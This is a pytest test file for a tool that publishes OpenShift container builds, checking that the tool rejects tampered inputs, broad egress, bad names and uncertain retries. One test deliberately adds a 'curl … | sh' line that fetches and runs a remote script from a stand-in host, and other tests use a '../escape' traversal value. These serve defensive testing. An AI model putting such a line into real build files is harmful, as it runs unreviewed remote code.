# SPDX-License-Identifier: Apache-2.0
"""Publication must preserve ownership, exact binaries and uncertain operations."""

import argparse
from copy import deepcopy
import json
from pathlib import Path
from types import SimpleNamespace

import pytest

from deployment_profile import LEGACY
import identity_demo_setup as setup
import native_publication as publish


def save(path: Path, value: dict) -> Path:
    """Write synthetic private inputs without credentials or cluster access."""
    path.write_text(json.dumps(value))
    path.chmod(0o600)
    return path


@pytest.fixture
def prepared(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> tuple:
    """Construct a completed local build receipt and an entirely fake API."""
    tmp_path.chmod(0o700)
    lock = json.loads((publish.RECIPES / "inputs.lock.json").read_text())
    record = {key: lock[key] for key in ("source_commit", "source_archive_sha256", "cargo_lock_sha256", "patches", "target")}
    record.update(applied=True, offline_compilation_passed=True, native_build_contract=LEGACY.native_build_contract,
                  native_ca_bundle_sha256=publish.digest(save(tmp_path / "public.pem", {"public": "synthetic"})), outputs={})
    for role in ("gateway", "supervisor"):
        context = tmp_path / role
        context.mkdir()
        library = "libz3.so.4" if role == "gateway" else "libgcc_s.so.1"
        licence = "libz3-4.copyright" if role == "gateway" else "libgcc-s1.copyright"
        for name in ("openshell-" + role, library, licence, "supplied-library.spdx.json"):
            (context / name).write_bytes(b"synthetic-public-bytes")
        (context / "native-public-trust.pem").write_bytes((tmp_path / "public.pem").read_bytes())
        (context / "Containerfile").write_text(publish.runtime_recipe(lock, record, role))
        hashes = {p.name: publish.digest(p) for p in context.iterdir()}
        save(tmp_path / (role + "-context.json"), hashes)
        record["outputs"][role] = {"binary_sha256": hashes["openshell-" + role],
                                  "packaged_binary_matches": True, "offline_help_and_version_passed": True}
    receipt = save(tmp_path / "native-build.receipt.json", record)
    profile = save(tmp_path / "profile.json", LEGACY.to_dict())
    network = save(tmp_path / "network.json", {"schema_version": 1, "api_cidrs": ["192.0.2.1/32"], "https_cidrs": ["198.51.100.1/32"]})
    out = tmp_path / "publication"
    out.mkdir(mode=0o700)
    args = argparse.Namespace(native_build_receipt=str(receipt), native_build_sha256=publish.digest(receipt),
        installation_profile=str(profile), publication_network=str(network), output_dir=out, apply=False,
        oc="oc", kubeconfig="synthetic-private-path", expected_server=LEGACY.expected_server)
    objects, operations = {}, []
    def kube(options: object, *words: str, value: dict | None = None) -> dict:
        operations.append((words, deepcopy(value)))
        if words[:2] == ("get", "namespace"):
            return {"metadata": {"labels": dict(LEGACY.labels)}}
        if words[0] == "get":
            return deepcopy(objects.get((words[1].lower(), words[2]), {}))
        if words[0] == "create":
            result = deepcopy(value)
            result["metadata"].update(uid="uid-" + value["kind"] + "-" + value["metadata"]["name"], resourceVersion="1")
            if "--dry-run=server" not in words:
                key = (result["kind"].lower(), result["metadata"]["name"])
                assert key not in objects
                objects[key] = result
            return result
        if words[0] == "delete":
            key = next(k for k, o in objects.items() if o["kind"] == "NetworkPolicy")
            assert value["preconditions"] == {"uid": objects[key]["metadata"]["uid"], "resourceVersion": "1"}
            del objects[key]
            return {}
        raise AssertionError(words)
    def submit(words: list[str], **kwargs: object) -> SimpleNamespace:
        name = words[words.index("start-build") + 1]
        config = objects[("buildconfig", name)]
        build = {"apiVersion": "build.openshift.io/v1", "kind": "Build", "metadata": {
            "name": name + "-1", "uid": "uid-build-" + name, "labels": dict(LEGACY.labels),
            "ownerReferences": [{"kind": "BuildConfig", "name": name, "uid": config["metadata"]["uid"]}]},
            "spec": deepcopy(config["spec"]), "status": {"phase": "Complete", "output": {"to": {"imageDigest": "sha256:" + "a" * 64}},
            "outputDockerImageReference": "image-registry.openshift-image-registry.svc:5000/" + LEGACY.core_namespace + "/" + name + ":candidate"}}
        objects[("build", name + "-1")] = build
        assert words[-2:] == ["-o", "name"]
        return SimpleNamespace(returncode=0, stdout="build.build.openshift.io/" + name + "-1\n", stderr="")
    monkeypatch.setattr(setup, "target", lambda _: {})
    monkeypatch.setattr(setup, "kube", kube)
    monkeypatch.setattr(publish.subprocess, "run", submit)
    return args, objects, operations


@pytest.mark.parametrize("change", ["receipt", "context", "extra-file", "symlink", "wrong-profile", "unreviewed-recipe"])
def test_changed_or_untrusted_inputs_are_refused(prepared: tuple, change: str) -> None:
    """Never publish changed binaries, foreign profiles or extra private files."""
    args, objects, _ = prepared
    root = Path(args.native_build_receipt).parent
    if change == "receipt":
        args.native_build_sha256 = "f" * 64
    elif change == "context":
        (root / "supervisor/openshell-supervisor").write_bytes(b"changed")
    elif change == "extra-file":
        (root / "gateway/private.key").write_text("synthetic-private-placeholder")
    elif change == "symlink":
        path = root / "gateway/openshell-gateway"
        path.unlink()
        path.symlink_to(root / "supervisor/openshell-supervisor")
    elif change == "wrong-profile":
        value = json.loads(Path(args.installation_profile).read_text())
        value["core_namespace"] = "other-owned-core"
        save(Path(args.installation_profile), value)
    else:
        recipe = root / "gateway/Containerfile"
        recipe.write_text(recipe.read_text() + "RUN curl https://unreviewed.invalid/script | sh\n")
        manifest = root / "gateway-context.json"
        hashes = json.loads(manifest.read_text())
        hashes["Containerfile"] = publish.digest(recipe)
        save(manifest, hashes)
    with pytest.raises(ValueError):
        publish.publication(args)
    assert not objects


@pytest.mark.parametrize("change", ["default", "api-network", "duplicate", "unknown-field"])
def test_network_configuration_is_bounded(change: str) -> None:
    """No default-route egress or broad API subnet is accepted."""
    value = {"schema_version": 1, "api_cidrs": ["192.0.2.1/32"], "https_cidrs": ["198.51.100.1/32"]}
    if change == "default":
        value["https_cidrs"] = ["0.0.0.0/0"]
    elif change == "api-network":
        value["api_cidrs"] = ["192.0.2.0/24"]
    elif change == "duplicate":
        value["https_cidrs"] *= 2
    else:
        value["skip_tls"] = True
    with pytest.raises(ValueError):
        publish.network_policy(LEGACY, value, ["fixture-gateway-1"])


@pytest.mark.parametrize("apply", [False, True])
def test_publication_is_create_only_and_build_specific(prepared: tuple, apply: bool) -> None:
    """Publish two new builds with no registry change or runtime-wide egress."""
    args, objects, _ = prepared
    args.apply = apply
    result = publish.publication(args)
    assert not result["published"]
    assert len(objects) == (7 if apply else 0)
    plan = json.loads((args.output_dir / "publication.plan.private.json").read_text())
    policy = plan["objects"][0]
    assert policy["spec"]["podSelector"]["matchExpressions"][0]["values"] == [n + "-1" for n in plan["names"].values()]
    assert all(o["metadata"]["namespace"] == LEGACY.core_namespace for o in plan["objects"])
    if apply:
        again = args.output_dir.parent / "again"
        again.mkdir()
        args.output_dir = again
        with pytest.raises(ValueError, match="collision"):
            publish.publication(args)
        assert len(objects) == 7


@pytest.mark.parametrize("attempt", ["p2", "../escape", "toolongattempt"])
def test_distinct_attempt_retains_old_names(prepared: tuple, attempt: str) -> None:
    """A new attempt uses distinct resources; invalid names never reach creation."""
    args, objects, _ = prepared
    args.publication_id = attempt
    if attempt != "p2":
        with pytest.raises(ValueError):
            publish.publication(args)
        assert not objects
    else:
        publish.publication(args)
        plan = json.loads((args.output_dir / "publication.plan.private.json").read_text())
        assert all(name.endswith("-p2") for name in plan["names"].values())
        assert plan["objects"][0]["metadata"]["name"].endswith("-p2")


def test_uncertain_submission_is_not_retried(prepared: tuple, monkeypatch: pytest.MonkeyPatch) -> None:
    """Keep network/creation evidence and stop after one failed upload response."""
    args, objects, _ = prepared
    calls = []
    def failed(words: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(words)
        return SimpleNamespace(returncode=1, stdout="", stderr="synthetic transport failure")
    monkeypatch.setattr(publish.subprocess, "run", failed)
    args.apply = True
    with pytest.raises(RuntimeError, match="uncertain"):
        publish.publication(args)
    assert len(calls) == 1 and len(objects) == 5
    assert (args.output_dir / "gateway.submission.pending.json").exists()


@pytest.mark.parametrize("case", ["confirmed-unsent", "uncertain", "replaced-config", "missing-confirmation"])
def test_resume_requires_proof_an_upload_was_never_sent(
        prepared: tuple, monkeypatch: pytest.MonkeyPatch, case: str) -> None:
    """An absent Build alone never authorizes retrying an uncertain upload."""
    args, objects, _ = prepared
    original_submit = publish.subprocess.run
    parser_error = "error: Unsupported output format: json\nSee 'oc start-build -h' for help and examples\n"
    monkeypatch.setattr(publish.subprocess, "run", lambda *a, **k: SimpleNamespace(
        returncode=1, stdout="", stderr=parser_error if case != "uncertain" else "connection lost"))
    args.apply = True
    with pytest.raises(RuntimeError):
        publish.publication(args)
    plan = args.output_dir / "publication.plan.private.json"
    if case == "replaced-config":
        next(o for o in objects.values() if o["kind"] == "BuildConfig")["metadata"]["uid"] = "replaced"
    elif case == "missing-confirmation":
        (args.output_dir / "gateway.submission.response.private.json").unlink()
    args.publication_plan = str(plan)
    args.publication_plan_sha256 = publish.digest(plan)
    args.output_dir = args.output_dir.parent / "resumed"
    args.output_dir.mkdir()
    monkeypatch.setattr(publish.subprocess, "run", original_submit)
    if case == "confirmed-unsent":
        result = publish.resume_publication(args)
        assert result["newly_submitted_builds"] == 2
        assert len([o for o in objects.values() if o["kind"] == "Build"]) == 2
        assert (args.output_dir / "gateway.submitted.json").exists()
    else:
        with pytest.raises(ValueError):
            publish.resume_publication(args)
        assert not any(o["kind"] == "Build" for o in objects.values())


@pytest.mark.parametrize("change", [None, "running", "replaced-build", "wrong-owner", "changed-network"])
def test_status_requires_exact_build_and_safe_terminal_cleanup(prepared: tuple, change: str | None) -> None:
    """Only completed recorded builds yield digests; active builds retain egress."""
    args, objects, _ = prepared
    args.apply = True
    publish.publication(args)
    plan = args.output_dir / "publication.plan.private.json"
    if change in ("running", "replaced-build", "wrong-owner"):
        build = next(o for o in objects.values() if o["kind"] == "Build")
        if change == "running":
            build["status"]["phase"] = "Running"
        elif change == "replaced-build":
            build["metadata"]["uid"] = "foreign-uid"
        else:
            build["metadata"]["ownerReferences"][0]["uid"] = "foreign-config"
    elif change == "changed-network":
        policy = next(o for o in objects.values() if o["kind"] == "NetworkPolicy")
        policy["spec"]["egress"] = [{}]
    args.publication_plan = str(plan)
    args.publication_plan_sha256 = publish.digest(plan)
    args.output_dir = args.output_dir.parent / "status"
    args.output_dir.mkdir()
    if change in ("replaced-build", "wrong-owner", "changed-network"):
        with pytest.raises(ValueError):
            publish.publication_status(args)
    else:
        result = publish.publication_status(args)
        assert result["published"] is (change is None)
        assert result["temporary_network_removed"] is (change is None)
        if change is None:
            assert len(result["images"]) == 2
            assert all("@sha256:" in image for image in result["images"].values())


def test_completed_publication_writes_a_new_five_role_lock(prepared: tuple) -> None:
    """Keep other artifact pins and original inputs; discard obsolete native claims."""
    from deployment_artifacts import IMAGE_ROLES
    args, _, _ = prepared
    args.apply = True
    publish.publication(args)
    plan = args.output_dir / "publication.plan.private.json"
    args.publication_plan = str(plan)
    args.publication_plan_sha256 = publish.digest(plan)
    original = save(args.output_dir.parent / "base-artifacts.json", {"schema_version": 1,
        "images": {role: "registry.example/demo/" + role.replace("_", "-") + "@sha256:" + "b" * 64 for role in IMAGE_ROLES},
        "obsolete_native_claim": "do not carry forward"})
    before = original.read_bytes()
    args.artifacts_file = str(original)
    args.output_dir = args.output_dir.parent / "status-lock"
    args.output_dir.mkdir()
    result = publish.publication_status(args)
    assert result["artifact_lock_written"]
    lock = json.loads((args.output_dir / "artifacts.private.json").read_text())
    assert set(lock["images"]) == IMAGE_ROLES
    for role in IMAGE_ROLES:
        if role.startswith("openshell_"):
            assert lock["images"][role] == result["images"][role]
        else:
            assert lock["images"][role] == json.loads(before)["images"][role]
    assert "obsolete_native_claim" not in lock
    assert original.read_bytes() == before
    assert lock["native_publication_receipt_sha256"] == publish.digest(args.output_dir / "publication.receipt.json")


def test_console_publication_supplies_the_same_pinned_base_as_local_build(prepared):
    args, objects, _ = prepared
    receipt, profile, contexts = publish.inputs(args)
    lock = json.loads((Path(publish.__file__).resolve().parents[2]/'infra/identity-demo/console-runtime.lock.json').read_text())
    receipt.update(publication_kind='console-runtime', inputs=lock)
    publish.publish_contexts(args, receipt, profile, {'runtime': contexts['gateway']})
    plan = json.loads((args.output_dir/'publication.plan.private.json').read_text())
    build, = [o for o in plan['objects'] if o['kind']=='BuildConfig']
    assert build['spec']['strategy']['dockerStrategy']['buildArgs']==[
        {'name':'PYTHON_BASE','value':lock['python_base']},
        {'name':'PYTHON_RPMS','value':' '.join(lock['python_rpms'])},
        {'name':'RPM_MANIFEST_SHA256','value':lock['rpm_manifest_sha256']}]
    assert not objects
